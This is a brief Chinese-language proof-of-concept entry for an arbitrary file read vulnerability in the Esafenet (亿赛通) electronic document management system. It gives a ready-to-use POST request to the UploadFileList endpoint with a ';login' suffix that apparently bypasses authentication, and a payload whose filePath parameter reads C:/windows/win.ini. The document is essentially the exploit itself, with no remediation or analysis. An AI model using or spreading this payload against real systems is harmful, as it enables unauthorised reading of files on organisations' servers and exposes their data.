# 亿赛通电子文档管理系统UploadFileList存在任意文件读取漏洞

亿赛通电子文档管理系统 ｜ 任意文件读取/写入 ｜ —
- **请求**：`POST /CDGServer3/document/UploadFileList;login HTTP/1.1`

**Payload**
```
command=veiwUploadFile&filePath=C:/windows/win.ini&fileName1=11111
```